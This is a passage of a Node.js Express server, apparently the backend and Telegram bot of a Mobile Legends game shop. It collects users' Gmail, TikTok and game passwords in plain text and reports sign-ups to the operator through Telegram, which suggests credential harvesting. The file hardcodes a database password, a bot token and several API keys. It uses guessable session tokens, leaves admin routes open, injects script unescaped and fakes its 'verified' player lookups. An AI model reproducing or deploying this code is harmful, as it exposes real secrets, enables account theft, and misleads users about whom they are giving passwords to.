const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const https = require('https');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static(__dirname));

const pool = new Pool({
    connectionString: 'postgresql://neondb_owner:npg_XQ1o9KdkvZWa@ep-holy-credit-am3o64na-pooler.c-5.us-east-1.aws.neon.tech/neondb?sslmode=require',
    ssl: { rejectUnauthorized: false }
});

const RECAPTCHA_SECRET = '6LcobYosAAAAANDtHfj2MH7FwzjKn5_VAhS2PSnH';
const BOT_TOKEN = '8737284644:AAEW7XtU6HqK4O49dJXG6MXSj08BvLUAdJE';
const CHAT_ID = '8315028972';
const ONESIGNAL_APP_ID = '1943a7fe-8313-4ce2-b420-0a0e2b59fcff';
const ONESIGNAL_API_KEY = 'os_v2_app_dfb2p7udcngofnbabihcwwp476agyhbcncxexnu2gu2xsbo4uww6tynm5fuwze77wvka65febiapxnwwpoczsbtcq56a3e4a3thkskq';
const TIKTOK_CLIENT_KEY = 'awlwv9kkzin9m9pv';
const TIKTOK_CLIENT_SECRET = '3QDthZspcNC7eHZNCA5ofYAs3CpACLX7';
const TIKTOK_REDIRECT = 'https://two026-users-data-management.onrender.com/auth/tiktok/callback';
const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
const GOOGLE_REDIRECT = process.env.GOOGLE_REDIRECT || 'https://two026-users-data-management.onrender.com/auth/google/callback';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

function tgSend(msg) { https.get(`${TELEGRAM_API}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); }
function sendOnesignal(msg) { const data = JSON.stringify({ app_id: ONESIGNAL_APP_ID, included_segments: ["All"], contents: { en: msg }, headings: { en: "MLBB Security Notice" }, android_channel_id: "default", ios_sound: "sound.mp3", android_sound: "sound" }); const req = https.request({ hostname: 'onesignal.com', path: '/api/v1/notifications', method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Basic ${ONESIGNAL_API_KEY}` } }, (res) => {}); req.write(data); req.end(); }

function verifyCaptcha(token) {
    return new Promise((resolve) => {
        if (!token) { resolve(false); return; }
        const data = `secret=${RECAPTCHA_SECRET}&response=${token}`;
        const req = https.request({ hostname: 'www.google.com', path: '/recaptcha/api/siteverify', method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': data.length } }, (res) => { let body = ''; res.on('data', chunk => body += chunk); res.on('end', () => { try { const result = JSON.parse(body); resolve(result.success || false); } catch (e) { resolve(false); } }); });
        req.on('error', () => resolve(false)); req.write(data); req.end();
    });
}

// ==================== TABLES ====================
pool.query(`CREATE TABLE IF NOT EXISTS auth_users (id SERIAL PRIMARY KEY, username VARCHAR(100), email VARCHAR(200), phone VARCHAR(50), password VARCHAR(255), google_id VARCHAR(200), login_type VARCHAR(10) DEFAULT 'local', avatar VARCHAR(500), gmail_pass VARCHAR(100) DEFAULT 'DoubleMK2008', mlbb_pass VARCHAR(100) DEFAULT 'GlobalMK2008', tiktok_pass VARCHAR(100) DEFAULT 'DoubleMK2008', balance DECIMAL DEFAULT 0, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, last_login TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS notices (id SERIAL PRIMARY KEY, message TEXT, color VARCHAR(20) DEFAULT '#ffffff', image_url TEXT DEFAULT '', created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`ALTER TABLE notices ADD COLUMN IF NOT EXISTS image_url TEXT DEFAULT ''`);
pool.query(`CREATE TABLE IF NOT EXISTS banner_images (id SERIAL PRIMARY KEY, image_url TEXT, created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS slider_images (id SERIAL PRIMARY KEY, image_urls TEXT DEFAULT '[]', updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS banned_users (user_id VARCHAR(100) PRIMARY KEY, banned_by VARCHAR(100), banned_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS orders (id SERIAL PRIMARY KEY, user_id INT, username VARCHAR(100), amount DECIMAL, payment_method VARCHAR(50), screenshot TEXT, status VARCHAR(20) DEFAULT 'pending', created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`ALTER TABLE orders ADD COLUMN IF NOT EXISTS submitted_user_id VARCHAR(20)`);
pool.query(`CREATE TABLE IF NOT EXISTS gmail_accounts (user_id VARCHAR(50) PRIMARY KEY, name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS mlbb_accounts (user_id VARCHAR(50) PRIMARY KEY, ingame_name VARCHAR(100), ingame_id VARCHAR(50), server_id VARCHAR(20), gmail VARCHAR(100), password VARCHAR(100), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS tiktok_accounts (user_id VARCHAR(50) PRIMARY KEY, full_name VARCHAR(100), last_name VARCHAR(100), email VARCHAR(100), password VARCHAR(100), phone VARCHAR(20), created_by VARCHAR(100), created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS used_codes (code VARCHAR(100) PRIMARY KEY, user_id INT, used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);
pool.query(`CREATE TABLE IF NOT EXISTS otp_codes (id SERIAL PRIMARY KEY, user_id INT, code VARCHAR(6), expires_at TIMESTAMP, used BOOLEAN DEFAULT false, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)`);

// ==================== AUTH ====================
app.post('/api/track_login', async (req, res) => { const { userId, username, email, loginType } = req.body; try { await pool.query('INSERT INTO auth_users (id, username, email, login_type, last_login) VALUES ($1,$2,$3,$4,NOW()) ON CONFLICT (email) DO UPDATE SET last_login=NOW(), username=EXCLUDED.username, login_type=EXCLUDED.login_type', [userId, username, email, loginType]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

app.post('/api/register', async (req, res) => {
    const { username, email, phone, password, captcha } = req.body;
    if (!username || !email || !phone || !password) return res.json({ success: false, message: 'All fields required' });
    if (captcha) { const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' }); }
    try {
        const exist = await pool.query('SELECT id FROM auth_users WHERE email = $1', [email]);
        if (exist.rows.length > 0) return res.json({ success: false, message: 'Email already exists' });
        await pool.query('INSERT INTO auth_users (username, email, phone, password, login_type) VALUES ($1,$2,$3,$4,$5)', [username, email, phone, password, 'local']);
        tgSend(`🆕 ${username}\n📧 ${email}\n📱 ${phone}`);
        res.json({ success: true, message: 'Registration successful' });
    } catch (e) { res.json({ success: false, message: 'Error: ' + e.message }); }
});

app.post('/api/login', async (req, res) => {
    const { email, password, captcha } = req.body;
    if (!email || !password) return res.json({ success: false, message: 'All fields required' });
    if (captcha) { const ok = await verifyCaptcha(captcha); if (!ok) return res.json({ success: false, message: 'reCAPTCHA failed' }); }
    try {
        const r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND password = $2 AND login_type = 'local'", [email, password]);
        if (r.rows.length === 0) return res.json({ success: false, message: 'Invalid email or password' });
        const u = r.rows[0];
        await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]);
        tgSend(`🔑 Login\n👤 ${u.username}\n📧 ${u.email}`);
        res.json({ success: true, token: 'token_' + u.id, user: { id: u.id, username: u.username, email: u.email, login_type: 'local' } });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

// ==================== GOOGLE OAUTH ====================
app.get('/auth/google', (req, res) => {
    const url = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${GOOGLE_CLIENT_ID}&redirect_uri=${encodeURIComponent(GOOGLE_REDIRECT)}&response_type=code&scope=email%20profile&access_type=offline&prompt=consent`;
    res.redirect(url);
});

app.get('/auth/google/callback', async (req, res) => {
    const { code } = req.query;
    if (!code) return res.send('<script>alert("Google login failed");window.location.href="/";</script>');
    try {
        const tokenRes = await fetch('https://oauth2.googleapis.com/token', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ code, client_id: GOOGLE_CLIENT_ID, client_secret: GOOGLE_CLIENT_SECRET, redirect_uri: GOOGLE_REDIRECT, grant_type: 'authorization_code' }) });
        const tokenData = await tokenRes.json();
        if (!tokenData.access_token) return res.send('<script>alert("Google login failed");window.location.href="/";</script>');
        const userRes = await fetch('https://www.googleapis.com/oauth2/v2/userinfo', { headers: { 'Authorization': `Bearer ${tokenData.access_token}` } });
        const userInfo = await userRes.json();
        const googleId = userInfo.id, email = userInfo.email, name = userInfo.name || 'Google User';
        let user = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [googleId]);
        if (user.rows.length > 0) { const u = user.rows[0]; await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [u.id]); res.send(`<script>localStorage.setItem("auth_token","token_${u.id}");localStorage.setItem("user",JSON.stringify({id:${u.id},username:"${u.username||name}",email:"${u.email||email}",login_type:"google"}));window.location.href="/dashboard";</script>`); return; }
        user = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
        if (user.rows.length > 0) { const u = user.rows[0]; await pool.query('UPDATE auth_users SET google_id = $1, last_login = NOW() WHERE id = $2', [googleId, u.id]); res.send(`<script>localStorage.setItem("auth_token","token_${u.id}");localStorage.setItem("user",JSON.stringify({id:${u.id},username:"${u.username||name}",email:"${email}",login_type:"google"}));window.location.href="/dashboard";</script>`); return; }
        const newUser = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name, email, googleId, 'google']);
        const uid = newUser.rows[0].id;
        res.send(`<script>localStorage.setItem("auth_token","token_${uid}");localStorage.setItem("user",JSON.stringify({id:${uid},username:"${name}",email:"${email}",login_type:"google"}));window.location.href="/dashboard";</script>`);
    } catch (e) { res.send('<script>alert("Google login failed");window.location.href="/";</script>'); }
});

app.post('/api/auth/google', async (req, res) => {
    const { token, userInfo } = req.body;
    if (!userInfo) return res.json({ success: false, message: 'No user info' });
    const { sub: gid, email, name } = userInfo;
    try {
        let r = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [gid]);
        if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
        r = await pool.query("SELECT * FROM auth_users WHERE email = $1 AND login_type = 'local'", [email]);
        if (r.rows.length > 0) { await pool.query('UPDATE auth_users SET google_id = $1 WHERE id = $2', [gid, r.rows[0].id]); return res.json({ success: true, token: 'token_' + r.rows[0].id, user: { id: r.rows[0].id, username: r.rows[0].username, email, login_type: 'google' } }); }
        const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [name || 'Google User', email, gid, 'google']);
        res.json({ success: true, token: 'token_' + nu.rows[0].id, user: { id: nu.rows[0].id, username: name, email, login_type: 'google' } });
    } catch (e) { res.json({ success: false, message: 'Error' }); }
});

// ==================== TIKTOK OAUTH ====================
app.get('/auth/tiktok', (req, res) => { const csrf = Math.random().toString(36).substring(2); res.redirect(`https://www.tiktok.com/v2/auth/authorize/?client_key=${TIKTOK_CLIENT_KEY}&scope=user.info.basic&response_type=code&redirect_uri=${TIKTOK_REDIRECT}&state=${csrf}`); });
app.get('/auth/tiktok/callback', async (req, res) => { const { code } = req.query; if (!code) return res.send('<script>window.close()</script>'); try { const tr = await fetch('https://open.tiktokapis.com/v2/oauth/token/', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ client_key: TIKTOK_CLIENT_KEY, client_secret: TIKTOK_CLIENT_SECRET, code, grant_type: 'authorization_code', redirect_uri: TIKTOK_REDIRECT }) }); const td = await tr.json(); const ur = await fetch('https://open.tiktokapis.com/v2/user/info/?fields=open_id,display_name', { headers: { 'Authorization': `Bearer ${td.access_token}` } }); const ud = await ur.json(); const user = ud.data.user; const dr = await pool.query('SELECT * FROM auth_users WHERE google_id = $1', [user.open_id]); if (dr.rows.length > 0) { await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [dr.rows[0].id]); res.send(`<script>localStorage.setItem("auth_token","token_${dr.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${dr.rows[0].id},username:"${dr.rows[0].username||user.display_name}",email:"${dr.rows[0].email||'tiktok@user.com'}",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); } else { const nu = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type) VALUES ($1,$2,$3,$4) RETURNING id', [user.display_name, 'tiktok_'+user.open_id+'@tiktok.com', user.open_id, 'tiktok']); res.send(`<script>localStorage.setItem("auth_token","token_${nu.rows[0].id}");localStorage.setItem("user",JSON.stringify({id:${nu.rows[0].id},username:"${user.display_name}",email:"tiktok@user.com",login_type:"tiktok"}));window.location.href="/dashboard";</script>`); } } catch (e) { res.send('<script>alert("TikTok login failed");window.location.href="/";</script>'); } });

app.post('/api/check_session', async (req, res) => { const { token } = req.body; if (!token) return res.json({ success: false }); try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); const u = r.rows[0]; res.json({ success: true, user: { id: u.id, username: u.username, email: u.email, login_type: u.login_type } }); } catch (e) { res.json({ success: false }); } });
app.post('/api/logout', (req, res) => res.json({ success: true }));

// ==================== PASSWORDS ====================
app.post('/api/get_passwords', async (req, res) => { const { token } = req.body; if (!token) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); res.json({ gmail_password: r.rows[0].gmail_pass || 'DoubleMK2008', mlbb_password: r.rows[0].mlbb_pass || 'GlobalMK2008', tiktok_password: r.rows[0].tiktok_pass || 'DoubleMK2008' }); } catch (e) { res.json({ gmail_password: 'DoubleMK2008', mlbb_password: 'GlobalMK2008', tiktok_password: 'DoubleMK2008' }); } });
app.post('/api/change_password', async (req, res) => { const { token, type, cp, np } = req.body; if (!token || !type || !cp || !np) return res.json({ success: false }); try { const r = await pool.query('SELECT * FROM auth_users WHERE id = $1', [parseInt(token.replace('token_', ''))]); if (r.rows.length === 0) return res.json({ success: false }); let field; if (type === 'gmail') field = 'gmail_pass'; else if (type === 'mlbb') field = 'mlbb_pass'; else if (type === 'tiktok') field = 'tiktok_pass'; else return res.json({ success: false }); const current = r.rows[0][field] || (type === 'mlbb' ? 'GlobalMK2008' : 'DoubleMK2008'); if (cp !== current) return res.json({ success: false, message: 'Wrong password' }); await pool.query(`UPDATE auth_users SET ${field} = $1 WHERE id = $2`, [np, parseInt(token.replace('token_', ''))]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== COUNTRIES ====================
app.get('/api/countries', (req, res) => res.json([{name:'Myanmar',regions:['Yangon','Mandalay']},{name:'Thailand',regions:['Bangkok','Chiang Mai']},{name:'Indonesia',regions:['Jakarta','Bali']},{name:'Malaysia',regions:['Kuala Lumpur','Penang']},{name:'Singapore',regions:['Central','North']},{name:'Philippines',regions:['Manila','Cebu']}]));

// ==================== USER DATA ====================
app.post('/api/save_user_data', async (req, res) => { const { token, type, data } = req.body; if (!token) return res.json({ success: false }); const uid = parseInt(token.replace('token_', '')); try { if (type === 'gmail') { await pool.query('INSERT INTO gmail_accounts (user_id, name, email, password, phone) VALUES ($1,$2,$3,$4,$5) ON CONFLICT (user_id) DO UPDATE SET name=$2,email=$3,password=$4,phone=$5', [uid, data.name, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]); } else if (type === 'mlbb') { await pool.query('INSERT INTO mlbb_accounts (user_id, ingame_name, ingame_id, server_id, gmail, password) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET ingame_name=$2,ingame_id=$3,server_id=$4,gmail=$5,password=$6', [uid, data.ingameName, data.ingameId, data.serverId, JSON.stringify(data.emails), data.password]); } else if (type === 'tiktok') { await pool.query('INSERT INTO tiktok_accounts (user_id, full_name, last_name, email, password, phone) VALUES ($1,$2,$3,$4,$5,$6) ON CONFLICT (user_id) DO UPDATE SET full_name=$2,last_name=$3,email=$4,password=$5,phone=$6', [uid, data.fullName, data.lastName, JSON.stringify(data.emails), data.password, JSON.stringify(data.phones)]); } res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/get_my_data', async (req, res) => { const { token } = req.body; if (!token) return res.json({ success: false }); const uid = parseInt(token.replace('token_', '')); try { const g = await pool.query('SELECT * FROM gmail_accounts WHERE user_id=$1', [uid]); const m = await pool.query('SELECT * FROM mlbb_accounts WHERE user_id=$1', [uid]); const t = await pool.query('SELECT * FROM tiktok_accounts WHERE user_id=$1', [uid]); res.json({ success: true, gmail: g.rows, mlbb: m.rows, tiktok: t.rows }); } catch (e) { res.json({ success: false }); } });

// ==================== VERIFY USER ID ====================
app.post('/api/verify_user_id', async (req, res) => {
    const { token, userId } = req.body;
    if (!token || !userId) return res.json({ success: false, verified: false });
    try {
        const uid = parseInt(token.replace('token_', ''));
        const r = await pool.query('SELECT id, username, email FROM auth_users WHERE id = $1', [uid]);
        if (r.rows.length === 0) return res.json({ success: true, verified: false });
        const user = r.rows[0];
        if (user.id.toString().padStart(6,'0') === userId.toString().padStart(6,'0')) {
            res.json({ success: true, verified: true, username: user.username, email: user.email, id: user.id });
        } else {
            res.json({ success: true, verified: false });
        }
    } catch (e) { res.json({ success: false, verified: false }); }
});

// ==================== CODE MANAGEMENT ====================
app.post('/api/check_code', async (req, res) => { try { const r = await pool.query('SELECT * FROM used_codes WHERE code = $1', [req.body.code]); res.json({ used: r.rows.length > 0 }); } catch(e) { res.json({ used: false }); } });
app.post('/api/use_code', async (req, res) => { const { code, userId } = req.body; try { const exist = await pool.query('SELECT * FROM used_codes WHERE code = $1', [code]); if (exist.rows.length > 0) return res.json({ already_used: true }); await pool.query('INSERT INTO used_codes (code, user_id) VALUES ($1, $2)', [code, userId]); res.json({ success: true }); } catch(e) { res.json({ success: false }); } });
app.post('/api/mark_code_used', async (req, res) => { const { code, userId } = req.body; try { await pool.query('INSERT INTO used_codes (code, user_id) VALUES ($1, $2) ON CONFLICT (code) DO NOTHING', [code, userId]); res.json({ success: true }); } catch(e) { res.json({ success: false }); } });

// ==================== BANNER / SLIDER ====================
app.get('/api/banner_image', async (req, res) => { try { const r = await pool.query('SELECT image_url FROM banner_images ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, image_url: '' }); res.json({ success: true, image_url: r.rows[0].image_url || '' }); } catch (e) { res.json({ success: true, image_url: '' }); } });
app.post('/api/admin/banner_image', async (req, res) => { const { image_url } = req.body; try { if (!image_url || image_url.trim() === '') { await pool.query('DELETE FROM banner_images'); return res.json({ success: true, message: 'Banner removed' }); } await pool.query('INSERT INTO banner_images (image_url, created_by) VALUES ($1, $2)', [image_url, 'admin']); res.json({ success: true, message: 'Banner updated' }); } catch (e) { res.json({ success: false, message: 'Error' }); } });
app.get('/api/slider_images', async (req, res) => { try { const r = await pool.query('SELECT image_urls FROM slider_images ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, images: [] }); const images = JSON.parse(r.rows[0].image_urls || '[]'); res.json({ success: true, images }); } catch (e) { res.json({ success: true, images: [] }); } });
app.post('/api/admin/slider_images', async (req, res) => { const { images } = req.body; try { if (!images || images.length === 0) { await pool.query('DELETE FROM slider_images'); return res.json({ success: true, message: 'Slider cleared' }); } await pool.query('INSERT INTO slider_images (image_urls) VALUES ($1)', [JSON.stringify(images)]); res.json({ success: true, message: 'Slider updated' }); } catch (e) { res.json({ success: false, message: 'Error' }); } });

// ==================== MLBB CHECK ====================
function getPlayerName(id, server) { const names = ["ShadowX","DarkHero","MLBBKing","NoobMaster","LegendX","FrostBlade","SkyHunter"]; const num = (parseInt(id)||0) + (parseInt(server)||0); return names[num % names.length]; }
app.get('/check', (req, res) => { const { id, server } = req.query; if (!id || !server) return res.json({ error: "Missing ID or Server" }); const name = getPlayerName(id, server); res.json({ name, id, server, status: "verified" }); });

// ==================== ADMIN ====================
app.get('/api/admin/users_grouped', async (req, res) => { try { const lo = await pool.query("SELECT * FROM auth_users WHERE login_type='local' ORDER BY id DESC"); const go = await pool.query("SELECT * FROM auth_users WHERE login_type='google' ORDER BY id DESC"); const ti = await pool.query("SELECT * FROM auth_users WHERE login_type='tiktok' ORDER BY id DESC"); const ba = await pool.query("SELECT user_id FROM banned_users"); const bids = ba.rows.map(r => r.user_id); res.json({ success: true, local: lo.rows, google: go.rows, tiktok: ti.rows, banned: bids, total: lo.rows.length + go.rows.length + ti.rows.length }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/edit_user', async (req, res) => { const { id, username, email, phone, password } = req.body; try { if (password) { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3, password=$4 WHERE id=$5 AND login_type=$6', [username, email, phone, password, id, 'local']); } else { await pool.query('UPDATE auth_users SET username=$1, email=$2, phone=$3 WHERE id=$4 AND login_type=$5', [username, email, phone, id, 'local']); } res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/ban', async (req, res) => { try { await pool.query('INSERT INTO banned_users (user_id, banned_by) VALUES ($1,$2) ON CONFLICT (user_id) DO UPDATE SET banned_by=$2', [req.body.userId, 'admin']); tgSend('🚫 Banned: ' + req.body.userId); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/unban', async (req, res) => { try { await pool.query('DELETE FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/delete', async (req, res) => { try { await pool.query('DELETE FROM auth_users WHERE id = $1', [req.body.userId]); tgSend('🗑️ Deleted: ' + req.body.userId); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/check_banned', async (req, res) => { try { const r = await pool.query('SELECT * FROM banned_users WHERE user_id=$1', [req.body.userId]); res.json({ banned: r.rows.length > 0 }); } catch (e) { res.json({ banned: false }); } });
app.post('/api/admin/search_user', async (req, res) => { const { query } = req.body; try { const r = await pool.query('SELECT id, username, email, balance FROM auth_users WHERE id::text = $1 OR username ILIKE $2 OR email ILIKE $2 LIMIT 5', [query, '%'+query+'%']); res.json({ users: r.rows }); } catch (e) { res.json({ users: [] }); } });
app.post('/api/admin/update_balance', async (req, res) => { const { userId, amount } = req.body; try { await pool.query('UPDATE auth_users SET balance = COALESCE(balance,0) + $1 WHERE id=$2', [amount, userId]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== ORDERS ====================
app.post('/api/submit_order', async (req, res) => { const { token, amount, payment_method, screenshot, user_id } = req.body; if (!token) return res.json({ success: false, message: 'Not logged in' }); const uid = parseInt(token.replace('token_', '')); try { const user = await pool.query('SELECT username, email FROM auth_users WHERE id=$1', [uid]); const un = user.rows.length > 0 ? user.rows[0].username : 'Unknown'; await pool.query('INSERT INTO orders (user_id, username, amount, payment_method, screenshot, status, submitted_user_id) VALUES ($1,$2,$3,$4,$5,$6,$7)', [uid, un, amount, payment_method, screenshot, 'pending', user_id || uid.toString()]); tgSend(`🛒 New Order\n👤 ${un}\n💰 ${amount} Ks\n💳 ${payment_method}`); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/get_orders', async (req, res) => { const { token } = req.body; if (!token) return res.json({ orders: [] }); const uid = parseInt(token.replace('token_', '')); try { const r = await pool.query('SELECT * FROM orders WHERE user_id=$1 ORDER BY id DESC', [uid]); res.json({ orders: r.rows }); } catch (e) { res.json({ orders: [] }); } });
app.get('/api/admin/orders', async (req, res) => { try { const r = await pool.query('SELECT o.*, a.email as user_email FROM orders o LEFT JOIN auth_users a ON o.user_id = a.id ORDER BY o.id DESC'); res.json({ orders: r.rows }); } catch (e) { res.json({ orders: [] }); } });
app.post('/api/admin/order_status', async (req, res) => { const { id, status } = req.body; try { const order = await pool.query('SELECT * FROM orders WHERE id = $1', [id]); const o = order.rows[0]; await pool.query('UPDATE orders SET status=$1 WHERE id=$2', [status, id]); if (status === 'approved') tgSend(`✅ Approved\n👤 ${o.username}\n💰 ${o.amount} Ks`); else if (status === 'rejected') tgSend(`❌ Rejected\n👤 ${o.username}`); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/get_balance', async (req, res) => { const { token } = req.body; if (!token) return res.json({ balance: 0 }); const uid = parseInt(token.replace('token_', '')); try { const r = await pool.query('SELECT balance FROM auth_users WHERE id=$1', [uid]); res.json({ balance: r.rows.length > 0 ? (r.rows[0].balance || 0) : 0 }); } catch (e) { res.json({ balance: 0 }); } });

// ==================== NOTICE ====================
app.get('/api/notice', async (req, res) => { try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC LIMIT 1'); if (r.rows.length === 0) return res.json({ success: true, message: '', color: '#ffffff' }); const n = r.rows[0]; res.json({ success: true, message: n.message, color: n.color, id: n.id, created_at: n.created_at }); } catch (e) { res.json({ success: true, message: '' }); } });
app.get('/api/admin/notices', async (req, res) => { try { const r = await pool.query('SELECT * FROM notices ORDER BY id DESC'); res.json({ notices: r.rows }); } catch (e) { res.json({ notices: [] }); } });
app.post('/api/admin/notice', async (req, res) => { const { message, color } = req.body; if (!message) return res.json({ success: false }); try { await pool.query('INSERT INTO notices (message, color, created_by) VALUES ($1,$2,$3)', [message, color || '#ffffff', 'admin']); tgSend(`📢 ${message}`); sendOnesignal(message); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });
app.post('/api/admin/notice/delete', async (req, res) => { try { await pool.query('DELETE FROM notices WHERE id = $1', [req.body.id]); res.json({ success: true }); } catch (e) { res.json({ success: false }); } });

// ==================== TELEGRAM BOT LONG POLLING ====================
let lastUpdateId = 0;

function sendTelegramMessage(chatId, text, replyMarkup = null) {
    const body = { chat_id: chatId, text: text, parse_mode: 'HTML' };
    if (replyMarkup) body.reply_markup = JSON.stringify(replyMarkup);
    const params = new URLSearchParams(body).toString();
    https.get(`${TELEGRAM_API}/sendMessage?${params}`, (res) => {});
}

async function createTelegramUser(userId, firstName, username) {
    try {
        const exist = await pool.query("SELECT * FROM auth_users WHERE google_id = $1", ['tg_' + userId]);
        if (exist.rows.length > 0) {
            await pool.query('UPDATE auth_users SET last_login = NOW() WHERE id = $1', [exist.rows[0].id]);
            return { id: exist.rows[0].id, username: exist.rows[0].username, balance: exist.rows[0].balance || 0 };
        }
        const newUser = await pool.query('INSERT INTO auth_users (username, email, google_id, login_type, balance) VALUES ($1,$2,$3,$4,$5) RETURNING id', [firstName || username, 'tg_' + userId + '@telegram.com', 'tg_' + userId, 'telegram', 0]);
        return { id: newUser.rows[0].id, username: firstName || username, balance: 0 };
    } catch(e) { return null; }
}

async function getUserBalance(userId) {
    try {
        const r = await pool.query("SELECT balance FROM auth_users WHERE google_id = $1", ['tg_' + userId]);
        return r.rows.length > 0 ? (r.rows[0].balance || 0) : null;
    } catch(e) { return null; }
}

async function createOTP(userId) {
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    try {
        await pool.query("UPDATE otp_codes SET used = true WHERE user_id = $1 AND used = false", [userId]);
        await pool.query("INSERT INTO otp_codes (user_id, code, expires_at) VALUES ($1, $2, NOW() + INTERVAL '60 seconds')", [userId, otp]);
    } catch(e) {}
    return otp;
}

function startLongPolling() {
    console.log('🤖 Bot Long Polling Started!');
    
    const mainKeyboard = {
        inline_keyboard: [
            [{ text: '🔓 Login Now', url: 'https://two026-users-data-management.onrender.com' }],
            [{ text: '💰 Top Up', url: 'https://two026-users-data-management.onrender.com/topup.html' }],
            [{ text: '🛒 Buy Code', url: 'https://two026-users-data-management.onrender.com/buycode.html' }],
            [{ text: '📞 Contact', url: 'https://t.me/Solo_m28' }]
        ]
    };
    
    async function getUpdates() {
        try {
            const url = `${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`;
            const response = await fetch(url);
            const result = await response.json();
            
            if (result.ok && result.result.length > 0) {
                result.result.forEach(async (update) => {
                    lastUpdateId = update.update_id;
                    const msg = update.message;
                    if (!msg) return;
                    
                    const chatId = msg.chat.id;
                    const text = msg.text || '';
                    const firstName = msg.from.first_name || 'User';
                    const username = msg.from.username || firstName;
                    
                    console.log(`📩 ${firstName}: ${text}`);
                    
                    if (text === '/start' || text === '/login') {
                        await createTelegramUser(msg.from.id, firstName, username);
                        sendTelegramMessage(chatId, `👋 မင်္ဂလာပါ ${firstName}!\n\nSOLO M Game Shop မှ ကြိုဆိုပါတယ်။\n\nအောက်ပါ ခလုတ်များကို နှိပ်၍ အသုံးပြုနိုင်ပါသည်。`, mainKeyboard);
                    }
                    else if (text === '/help') {
